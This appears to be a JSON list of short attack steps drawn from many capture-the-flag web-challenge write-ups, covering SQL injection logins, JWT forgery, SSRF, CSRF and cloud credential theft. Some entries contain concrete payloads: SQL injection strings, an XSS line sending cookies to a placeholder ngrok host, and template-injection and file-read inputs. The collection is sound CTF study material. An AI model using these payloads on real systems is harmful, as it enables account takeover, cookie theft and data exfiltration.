    "Hypothesized that the login page might be filtering requests by the user's IP address.",
    "Set the 'X-Forwarded-For' header to '192.168.3.16'.",
    "Gained access to the login page.",
    "Identified fields labeled 'username' and 'password'.",
    "Used the payload 'username=test&password=test' or 1=1 LIMIT 1;#'.",
    "Bypassed authentication.",
    "Logged in as the admin.",
    "Noted that the site does not require proof of domain ownership.",
    "Create two user accounts",
    "Identify USER_ID.",
    "Identify FILENAME.",
    "Bypassed filter.",
    "Payload 3: Obtained readable cookies.",
    "Found that JavaScript couldn't read any cookies from the output of the payloads.",
    "Received a `Set-Cookie` header from this page for a new cookie with HttpOnly flag set.",
    "Endpoint had been inaccessible due to lack of the appropriate cookie.",
    "Revisited the page with the newly acquired 'admin' cookie.",
    "Recognize that the 'guest' cookie is base 64 decoded in the deserialization process.",
    "Perform the action with `nobody` user permissions.",
    "Give SUID and SGID permissions to the binary.",
    "Increase the privileges.",
    "Note that the Traefik service only accepts the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Claim the flag.",
    "Notice that the 'screenshotter' service allows users to enter arbitrary URLs.",
    "Identified that a 'secret' token is added to cookies in the request to the backend server.",
    "Obtained knowledge of the 'secret' token.",
    "Learned that the backend server checks for the 'secret' cookie.",
    "Discovered that the flag is returned by the backend server only if the 'secret' cookie is present.",
    "Note that the JWT token needs to have the role attribute changed to admin.",
    "Study the registration and login process.",
    "Note that a JWT key is created for each new user during registration.",
    "Understand that the JWT key is used to sign the token during login.",
    "Identify the caching mechanism for user JWT keys.",
    "Note that each user's JWT key is stored in a Redis cache.",
    "Observe that the JWT key is only stored for 2 seconds.",
    "Note that the process only permits requests from a client URL validated to be 127.0.0.1.",
    "Note that the cached secret is only available for 2 seconds after logging in.",
    "Understand that the SSRF request must be made immediately after login.",
    "Use the JWT secret to create a JWT with the admin role.",
    "Make a request to /flag using the new admin JWT token.",
    "Registered a new account.",
    "Examined how the OTP verification is performed.",
    "Used the obtained OTP for verification and login.",
    "Noted that the `/api/token` endpoint returns the current authentication token.",
    "Obtained the admin's token.",
    "Exploiting the fact that the token for id=0 is the same every time.",
    "Submitting the generated token to retrieve the flag.",
    "Verify that the WebSocket client's origin starts with 'http://localhost'.",
    "Check if the client has the correct 'auth' cookie set.",
    "Understand that the correct 'auth' cookie is set at the '/auth' endpoint.",
    "Confirm that the request to the '/auth' endpoint is made locally by the admin bot.",
    "Set the authentication cookie for the victim using JavaScript.",
    "Realize that there is no vulnerability in the ws.origin.",
    "Understand that the Origin request header cannot be modified by JavaScript.",
    "Identify that CSRF token is not being checked.",
    "Set the auth token by making the bot visit 'http://localhost:7070/auth'.",
    "Understood that the input had to satisfy certain constraints, chiefly that 'name' could only contain alphanumeric characters, and 'email' had to pass RFC5322 validation.",
    "Aim to reset the admin's 2FA code through the POST request.",
    "Include 'credentials: include' in the request to bypass same-origin policy restrictions.",
    "The response text contains the new 2FA token.",
    "Decode the 2FA token received from the previous step.",
    "Obtain the admin 2FA code from the decoded token.",
    "Use the 2FA token on an authenticator application.",
    "Generate the admin 2FA codes with the authenticator application.",
    "Use the generated 2FA code for another CSRF attack.",
    "Include the stolen 2FA codes in the request.",
    "Include 'otp' and 'secretId' in the request body.",
    "Enabled 'enable_experimental_features'.",
    "Identified the allowance of loading stylesheets from '*.jsapi.tech'.",
    "Use 'request.args' to bypass banned characters.",
    "Bypassed the validation by using a different case.",
    "Set 'Content-Length: 0' for the first request.",
    "Confirmed the SameSite attribute of the cookies.",
    "Understand that customer eligibility is based on fame and point history.",
    "The bug is in the unauthenticated index page.",
    "Register as a new user.",
    "Unlock and buy the 'flagsword'.",
    "Used the appropriate 'X-Cat-Header' in the request",
    "Obtained AWS credentials from the response",
    "Identified privileged permissions to create AWS Lambda functions",
    "Identified privileged permissions to invoke AWS Lambda functions",
    "Obtained new AWS credentials",
    "Discover that all other endpoints are protected by authenticationMiddleware.",
    "Authenticate successfully.",
    "Bypass the access control implemented on ATS.",
    "Weak point: negative flag price not validated in 'sellFlag' function",
    "Create separate account",
    "Establish session.",
    "Print the session cookies.",
    "Discover that the website uses JWT tokens.",
    "Understand the JWT processing by the server.",
    "Realize that the server signs new RS256 tokens with the private key, signKey.",
    "Understand that we can generate our own HS256 token since we know the public key.",
    "Sign a token with the public key verifyKey.",
    "Registered a new user.",
    "Attempted to login which returns 'User not active' error.",
    "Identified that a successful password reset would set 'user.active' to 'True', activating the user account.",
    "Requested an OTP at '/request_code'.",
    "Identified that the rate limiting limits the number of OTP attempts to 3.",
    "Identified that the OTP code was validated using SQL 'LIKE' operator.",
    "Attempted to bypass `is_valid_email(email)` function.",
    "Gained access by passing the OTP check.",
    "Noted that the post is only visible to the admin.",
    "Provided a callback parameter.",
    "Steal the admin's cookie.",
    "Create a policy that only allows form submissions to a specific domain",
    "'smtp_exec' variable is used in sending activation emails",
    "Upon granting admin privileges",
    "Use the credentials for `http://app/` in the fetch request",
    "Ensure the injected `style` element is readable by the attacker",
    "Use the known hash of an empty string as a token value for authentication.",
    "Provide authentication to view the server logs.",
    "Use 'Host: app@ATTACKER_URL' to bypass the validation",
    "Use the custom host header to target your own host",
    "The first response is designed to pass the SSRF check.",
    "Identify that if the request token is wrong, then the 'request.accessGranted' attribute would not be set.",
    "Inspect the decoded payload.",
    "Identify the route as '/getFile?file=admins'.",
    "Download the '.env' file.",
    "Realize the split parts were stored against assigned keys",
    "Get the value from the cookie",
    "Pass the final payload '/admin'",
    "Run the server script with a new payload '?icecream={{application.settings[\"cookie_secret\"]}}'.",
    "Locate the 'Cookie' header in the HTTP request.",
    "Begin SQL Injection attack",
    "Infer from the knowledge of SQL Injection that the username and password input can be manipulated.",
    "Inject a classic SQL Injection payload (' or 1=1 -- ) into the username field.",
    "Inject a classic SQL Injection payload (' or 1=1 -- ) into the password field.",
    "Inject the SQL Injection payload into the username field.",
    "Inject the SQL Injection payload into the password field.",
    "Submit the manipulated username and password.",
    "Login with given credentials using the Google Chrome Network tab.",
    "Capture the payload of the response, identifying the included JWT token.",
    "Encode a new JWT token with the modified 'role'.",
    "Applied the payload to the live environment",
    "Examine the source code.",
    "Identify that 'RS256' and 'HS256' algorithms are allowed for decryption in 'challenge/helpers/JWTHelper.js'.",
    "After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file.",
    "Intercept an HTTP request or use a cookie editor tool.",
    "Press 'login' on the login page.",
    "Use a Python script to brute force the password",
    "Retrieve the value of AUTH_SECRET from the .env file",
    "Identify the flag in the 'X-Localhost-Token' header in the received server response.",
    "Analyse the response of the authentication API",
    "Modify the value of 'admin_id' cookie to '1'",
    "Find the file named configs.zip on the webpage.",
    "Research methods of bypassing strict checks.",
    "Set a 'flag' variable based on the response of the previous POST request.",
    "Observe the presence of a CSRF token.",
    "Identify the user 'true.grit@umbccd.io' through PCAP analysis.",
    "Spot '@login_required' annotations as indicators.",
    "Step 2: Validate and insert into the database.",
    "Use the database credentials for authentication.",
    "Set the username as '{open('/flag').read()}' to trigger a Remote Code Execution during authentication.",
    "Include the necessary characters in the final URL.",
    "Use this as a proof-of-concept for XSS vulnerability",
    "Passed a SQL command into the X-FORWARDED-FOR header.",
    "Make a GET request to the /api/admin endpoint with the new JWT.",
    "Create a malicious input for the username",
    "Find the details of the desired user under the post search section",
    "Check the value of the cookie 'not_admin'",
    "Identify the username and password values.",
    "Exclude the existing private key parameter through '#'.",
    "Force the debugging private key in the link.",
    "Remembered that a Cloudflare error was triggered in the instance by SQL injection.",
    "Observe that the '/pleb' proxy isn't forwarding non-ASCII characters.",
    "Determine that the specific replace function does not sanitize the 'alt' parameter.",
    "Flag was in the user agent.",
    "Allowed reading the flag",
    "Sent the SQL query to FD 4 (MySQL server).",
    "Read the response from FD 4.",
    "Wrote the received response to the intended output.",
    "Find the option to pass it as a URL parameter.",
    "Understand that the crucial check occurs in the 'checkout(req, res)' function that verifies the token's signature matches the key.",
    "Note the presence of 'username', 'cnonce', and 'hash' parameters.",
    "Attempt to utilize CSRF mechanism.",
    "Share the password.",
    "Contain the password.",
    "Recognized second flag hidden in express endpoint /api/true-answer accessible only from localhost.",
    "Note the MongoDB storage of a password with username 'admin'.",
    "Sent the payload <img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>.",
    "Revealed the 'username', 'uid', and 'iat' from the decoded JWT token.",
    "Visit the admin's profile and find out it is private.",
    "Line shows: '+ /.env: .env file found. The .env file may contain credentials.'",
    "Inject the 'id' command in the input box.",
    "Submit multiple 'n' parameters with the same value in the web application.",
    "Note that it includes the ability to upload photos.",
    "The server misconstrues the public key as an HMAC private key due to the vulnerability.",
    "Verify if the count returns 1.",
    "Send POST request to upload the generated file.",
    "Send a POST request to upload the created file.",
    "Sensitive, user-specific data could be read if /api/filter endpoint returns based on these cookies",
    "CSRF to /api/flag is needed",
    "Use the /find endpoint to inject a Set-Cookie header.",
    "Have the user (admin) visit the URLs.",
    "View files using the 'file://' protocol.",
    "Noted that the single request contains the admin's headers.",
    "Redirected to own account upon a successful enumeration (403 redirect).",
    "Change the 'account[role]' attribute to 'admin'",
    "Locate the login function in the web application.",
    "Input the SQL injection payload in the 'username' field as `username=admin&password=' or '1`.",
    "Input the SQL injection payload in the 'password' field as `username=admin&password=' or '1`.",
    "The deserialized object is assigned to the $perm variable in 'authentication.php'",
    "Realize the challenge of reaching the Python microservice while the Traefik proxy only allows the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Extracted the 'secret' cookie value from the request.",
    "Note that the server checks the X-Forwarded-For header to validate the client IP.",
    "Observe that the end-point returns base64-encoded result of each ping request.",
    "Target the admin as the victim of the CSRF attack.",
    "Set 'GET /flag HTTP/1.1' as the second request.",
    "Sent a request to the API endpoint",
    "Used the new AWS credentials to access DynamoDB",
    "Gain access to the application.",
    "Use the `nonce` to bypass the CSP again."
]